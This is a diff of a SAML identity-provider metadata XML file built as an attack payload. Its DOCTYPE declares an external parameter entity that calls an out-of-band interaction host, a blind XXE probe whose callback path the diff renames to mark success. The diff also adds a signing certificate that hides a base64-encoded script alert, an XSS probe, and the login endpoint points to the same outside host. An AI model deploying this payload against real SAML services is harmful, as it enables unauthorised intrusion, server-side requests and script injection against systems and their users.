@@ -1,10 +1,15 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE md:EntityDescriptor [
-  <!ENTITY % xxe SYSTEM "https://b8df73e81a46ec95041bg16z11eyyyyyb.oast.pro/GITHUB_PAGES_HIT">
+  <!ENTITY % xxe SYSTEM "https://b8df73e81a46ec95041bg16z11eyyyyyb.oast.pro/GITHUB_XXE_SUCCESS">
   %xxe;
 ]>
 <md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://mohammedborai404.github.io">
   <md:IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
+    <md:KeyDescriptor use="signing">
+      <ds:KeyInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
+        <ds:X509Data><ds:X509Certificate>PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</ds:X509Certificate></ds:X509Data>
+      </ds:KeyInfo>
+    </md:KeyDescriptor>
     <md:SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" Location="https://b8df73e81a46ec95041bg16z11eyyyyyb.oast.pro/sso"/>
   </md:IDPSSODescriptor>
 </md:EntityDescriptor>
